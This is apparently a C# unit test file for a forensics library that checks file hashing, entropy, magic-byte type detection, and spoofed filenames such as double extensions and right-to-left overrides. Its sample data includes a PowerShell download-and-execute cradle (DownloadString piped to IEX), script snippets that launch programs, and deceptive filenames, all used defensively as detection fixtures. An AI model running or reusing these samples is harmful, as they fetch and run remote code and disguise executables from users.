using System.Security.Cryptography;
using System.Text;
using EzForensics.Core.Explore;
using EzForensics.Core.Sysinternals;
using FluentAssertions;

namespace EzForensics.Core.Tests;

public sealed class ExploreFileFactsTests : IDisposable
{
    private readonly TempDir _tmp = new();
    public void Dispose() => _tmp.Dispose();

    [Fact]
    public void Entropy_of_constant_is_zero_and_of_all_bytes_is_eight()
    {
        Entropy.Of(new byte[1000]).Should().Be(0);
        Entropy.Of(Enumerable.Range(0, 256 * 4).Select(i => (byte)i).ToArray()).Should().BeApproximately(8, 1e-9);
        Entropy.Of("ab"u8).Should().BeApproximately(1, 1e-9);
        Entropy.Of(ReadOnlySpan<byte>.Empty).Should().Be(0);
    }

    [Fact]
    public void Hashes_match_the_framework_and_one_pass_gives_entropy_and_type()
    {
        var p = Path.Combine(_tmp.Path, "a.png");
        var bytes = new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A }.Concat(Enumerable.Range(0, 3_000_000).Select(i => (byte)(i * 7))).ToArray();
        File.WriteAllBytes(p, bytes);
        var f = FileFactsReader.Compute(p, new FileFactsOptions { VerifySignature = false });
        f.Hashes.Md5.Should().Be(Convert.ToHexString(MD5.HashData(bytes)));
        f.Hashes.Sha1.Should().Be(Convert.ToHexString(SHA1.HashData(bytes)));
        f.Hashes.Sha256.Should().Be(Convert.ToHexString(SHA256.HashData(bytes)));
        f.Hashes.Length.Should().Be(bytes.Length);
        f.Entropy.Should().BeApproximately(Entropy.Of(bytes), 1e-9);
        f.Type.Id.Should().Be("png");
        f.ExtensionMismatch.Should().BeFalse();
        f.Signature.Should().BeNull();
    }

    [Theory]
    [InlineData("png", "photo.jpg", true)]
    [InlineData("png", "photo.png", false)]
    [InlineData("pe", "invoice.pdf", true)]
    [InlineData("pe", "setup.exe", false)]
    [InlineData("pe", "noext", true)]
    [InlineData("pdf", "doc.pdf", false)]
    [InlineData("pdf", "doc.txt", true)]
    [InlineData("zip", "a.zip", false)]
    [InlineData("ooxml", "a.docx", false)]
    [InlineData("ooxml", "a.zip", true)]
    [InlineData("hive", "NTUSER.DAT", false)]
    [InlineData("hive", "SYSTEM", false)]
    [InlineData("rtf", "letter.doc", true)]
    [InlineData("ps", "notes.jpg", true)]
    [InlineData("ps", "notes.txt", false)]
    [InlineData("ps", "run.ps1", false)]
    [InlineData("text", "x.jpg", false)]
    public void Magic_detection_and_extension_mismatch(string kind, string name, bool mismatch)
    {
        var head = Sample(kind);
        var t = MagicSignatures.Detect(head);
        t.IsMismatch(Path.GetExtension(name)).Should().Be(mismatch, $"{kind} as {name} detected {t.Id}");
    }

    [Theory]
    [InlineData("pe", "pe")]
    [InlineData("dll", "pe-dll")]
    [InlineData("elf", "elf")]
    [InlineData("zip", "zip")]
    [InlineData("ooxml", "ooxml-word")]
    [InlineData("ole", "ole")]
    [InlineData("pdf", "pdf")]
    [InlineData("rtf", "rtf")]
    [InlineData("png", "png")]
    [InlineData("jpeg", "jpeg")]
    [InlineData("gif", "gif")]
    [InlineData("7z", "7z")]
    [InlineData("rar", "rar")]
    [InlineData("gzip", "gzip")]
    [InlineData("lnk", "lnk")]
    [InlineData("evtx", "evtx")]
    [InlineData("hive", "hive")]
    [InlineData("sqlite", "sqlite")]
    [InlineData("ps", "script-powershell")]
    [InlineData("bat", "script-batch")]
    [InlineData("vbs", "script-vbscript")]
    [InlineData("js", "script-javascript")]
    [InlineData("hta", "script-hta")]
    [InlineData("sh", "script-shebang")]
    [InlineData("text", "text")]
    [InlineData("bin", "unknown")]
    public void Detects_types(string kind, string id) => MagicSignatures.Detect(Sample(kind)).Id.Should().Be(id);

    [Fact]
    public void Detects_real_pe_from_disk()
    {
        var t = MagicSignatures.Detect(File.ReadAllBytes(FakeToolPaths.Exe).AsSpan(0, 4096));
        t.Id.Should().Be("pe");
        // The Core class library has the DLL flag (FakeTool.dll is an app's main assembly, which .NET builds as an EXE image).
        MagicSignatures.Detect(File.ReadAllBytes(typeof(FileFactsReader).Assembly.Location).AsSpan(0, 4096)).Id.Should().Be("pe-dll");
    }

    [Theory]
    [InlineData("invoice.pdf.exe", true, false, "pdf", "exe")]
    [InlineData("photo.jpg.scr", true, false, "jpg", "scr")]
    [InlineData("archive.tar.gz", false, false, null, "gz")]
    [InlineData("report.final.docx", false, false, null, "docx")]
    [InlineData("invoice‮fdp.exe", false, true, null, "exe")]
    [InlineData("annual‮xcod.scr", false, true, null, "scr")]
    [InlineData("plain.exe", false, false, null, "exe")]
    public void Double_extension_and_rtlo(string name, bool dbl, bool bidi, string? decoy, string real)
    {
        var n = NameChecks.Analyze(name);
        n.DoubleExtension.Should().Be(dbl);
        n.HasBidiOverride.Should().Be(bidi);
        n.DecoyExtension.Should().Be(decoy);
        n.RealExtension.Should().Be(real);
        n.Any.Should().Be(dbl || bidi);
    }

    [Fact]
    public void Padded_name_is_flagged()
    {
        var n = NameChecks.Analyze("photo.jpg                 .exe");
        n.PaddedBeforeExtension.Should().BeTrue();
        n.DoubleExtension.Should().BeTrue();
    }

    [Fact]
    public void Zone_identifier_parses_keys_and_zone_name()
    {
        var z = ZoneIdentifier.Parse("[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=https://example.com/page\r\nHostUrl=https://dl.example.com/a.exe\r\n")!;
        z.ZoneId.Should().Be(3);
        z.ZoneName.Should().Be("Internet");
        z.HostUrl.Should().Be("https://dl.example.com/a.exe");
        z.ReferrerUrl.Should().Be("https://example.com/page");
        ZoneIdentifier.Parse("[ZoneTransfer]\nZoneId=x\n").Should().BeNull();
        ZoneIdentifier.Parse("").Should().BeNull();
        ZoneIdentifier.Parse("[ZoneTransfer]\nZoneId=4")!.ZoneName.Should().Be("Restricted sites");
    }

    [Fact]
    public void Ads_and_zone_identifier_are_read_from_ntfs()
    {
        if (!OperatingSystem.IsWindows()) return;
        var p = Path.Combine(_tmp.Path, "dl.exe.txt");
        File.WriteAllText(p, "hello");
        try { File.WriteAllText(p + ":Zone.Identifier", "[ZoneTransfer]\r\nZoneId=3\r\nHostUrl=https://evil.example/x\r\n"); }
        catch (IOException) { return; }   // not NTFS
        File.WriteAllText(p + ":extra", "12345");
        var f = FileFactsReader.Compute(p);
        f.Streams.Select(s => s.Name).Should().BeEquivalentTo("Zone.Identifier", "extra");
        f.Streams.Single(s => s.Name == "extra").Size.Should().Be(5);
        f.Zone!.ZoneId.Should().Be(3);
        f.Zone.HostUrl.Should().Be("https://evil.example/x");
        f.HasMarkOfTheWeb.Should().BeTrue();
        f.Type.Id.Should().Be("text");
    }

    [Fact]
    public void Signature_is_checked_only_for_pe_with_the_given_verifier()
    {
        var v = new CountingVerifier();
        var pe = Path.Combine(_tmp.Path, "t.exe");
        File.Copy(FakeToolPaths.Exe, pe);
        var txt = Path.Combine(_tmp.Path, "t.txt");
        File.WriteAllText(txt, "hi");
        FileFactsReader.Compute(pe, new FileFactsOptions { Verifier = v }).Signature!.Detail.Should().Be("stub");
        FileFactsReader.Compute(txt, new FileFactsOptions { Verifier = v }).Signature.Should().BeNull();
        v.Calls.Should().Be(1);
    }

    [Fact]
    public void Real_unsigned_pe_reports_not_valid()
    {
        if (!OperatingSystem.IsWindows()) return;
        var pe = Path.Combine(_tmp.Path, "u.exe");
        File.Copy(FakeToolPaths.Exe, pe);
        var f = FileFactsReader.Compute(pe);
        f.IsPe.Should().BeTrue();
        f.Signature!.Valid.Should().BeFalse();
    }

    private sealed class CountingVerifier : ISignatureVerifier
    {
        public int Calls;
        public SignatureCheck Verify(string file) { Calls++; return new(false, false, null, null, "stub"); }
    }

    internal static byte[] Sample(string kind) => kind switch
    {
        "pe" => MiniPe(dll: false),
        "dll" => MiniPe(dll: true),
        "elf" => new byte[] { 0x7F, 0x45, 0x4C, 0x46, 2, 1, 1, 0 },
        "zip" => Zip("readme.txt"),
        "ooxml" => Zip("[Content_Types].xml", "word/document.xml"),
        "ole" => new byte[] { 0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1, 0, 0 },
        "pdf" => "%PDF-1.7\n1 0 obj"u8.ToArray(),
        "rtf" => @"{\rtf1\ansi hello}"u8.ToArray(),
        "png" => new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0, 0 },
        "jpeg" => new byte[] { 0xFF, 0xD8, 0xFF, 0xE0, 0, 0x10 },
        "gif" => "GIF89a\x01\x00"u8.ToArray(),
        "7z" => new byte[] { 0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C, 0, 4 },
        "rar" => new byte[] { 0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x01, 0x00 },
        "gzip" => new byte[] { 0x1F, 0x8B, 0x08, 0, 0, 0 },
        "lnk" => new byte[] { 0x4C, 0, 0, 0, 0x01, 0x14, 0x02, 0, 0, 0 },
        "evtx" => "ElfFile\0\0\0"u8.ToArray(),
        "hive" => "regf\x01\x02\x03\x04"u8.ToArray(),
        "sqlite" => "SQLite format 3\0\x10\x00"u8.ToArray(),
        "ps" => "$wc = New-Object System.Net.WebClient\r\n$d = $wc.DownloadString('http://x')\r\nIEX $d\r\n"u8.ToArray(),
        "bat" => "@echo off\r\nset X=1\r\ngoto end\r\n:end\r\n"u8.ToArray(),
        "vbs" => "Dim sh\r\nSet sh = CreateObject(\"WScript.Shell\")\r\nsh.Run \"calc\"\r\n"u8.ToArray(),
        "js" => "var sh = new ActiveXObject(\"WScript.Shell\");\nfunction run() { sh.Run('x'); }\n"u8.ToArray(),
        "hta" => "<html><head><HTA:APPLICATION ID=\"x\"></head></html>"u8.ToArray(),
        "sh" => "#!/bin/sh\necho hi\n"u8.ToArray(),
        "text" => "Just some notes about the case.\r\nNothing to see.\r\n"u8.ToArray(),
        "bin" => new byte[] { 0x00, 0x01, 0x02, 0x03, 0xFE, 0x00, 0x10, 0x99 },
        _ => throw new ArgumentOutOfRangeException(nameof(kind)),
    };

    private static byte[] Zip(params string[] names)
    {
        using var ms = new MemoryStream();
        using (var z = new System.IO.Compression.ZipArchive(ms, System.IO.Compression.ZipArchiveMode.Create, true))
            foreach (var n in names) { using var s = z.CreateEntry(n).Open(); s.Write(Encoding.ASCII.GetBytes("x")); }
        return ms.ToArray();
    }

    private static byte[] MiniPe(bool dll)
    {
        var b = new byte[0x200];
        b[0] = (byte)'M'; b[1] = (byte)'Z';
        BitConverter.GetBytes(0x80).CopyTo(b, 0x3C);
        "PE\0\0"u8.CopyTo(b.AsSpan(0x80));
        BitConverter.GetBytes((ushort)0x8664).CopyTo(b, 0x84);
        BitConverter.GetBytes((ushort)(dll ? 0x2022 : 0x0022)).CopyTo(b, 0x80 + 22);
        BitConverter.GetBytes((ushort)0x20B).CopyTo(b, 0x80 + 24);
        BitConverter.GetBytes((ushort)3).CopyTo(b, 0x80 + 24 + 68);
        return b;
    }
}
